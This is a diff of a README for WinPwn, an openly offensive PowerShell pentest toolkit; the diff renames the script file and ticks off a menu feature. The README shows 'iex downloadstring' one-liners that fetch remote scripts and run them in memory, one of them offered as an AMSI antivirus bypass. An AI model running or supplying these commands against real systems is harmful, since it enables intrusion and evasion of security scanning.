@@ -7,8 +7,8 @@ Yes it is not a C# and it may be flagged by antivirus solutions. Windows Defende
 Any suggestions, feedback and comments are welcome!
 
 Just Import the Modules with:
-`Import-Module .\WinPwn_v0.7.ps1` or 
-`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.7.ps1')`
+`Import-Module .\WinPwn.ps1` or 
+`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn.ps1')`
 
 For AMSI Bypass use the following oneliner:
 `iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/ObfusWinPwn.ps1')`
@@ -60,7 +60,7 @@ The submodule is a forked and edited version of https://github.com/Cn33liz/p0wne
 - [ ] More Recon/Exploitation functions
 - [ ] msDS-AllowedToActOnBehalfOfOtherIdentity Ressource based constrained delegation
 - [x] Add MS17-10 Scanner
-- [ ] Add menu for better handling of functions
+- [x] Add menu for better handling of functions
 - [x] Amsi Bypass
 
 ![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/Pwn.png)
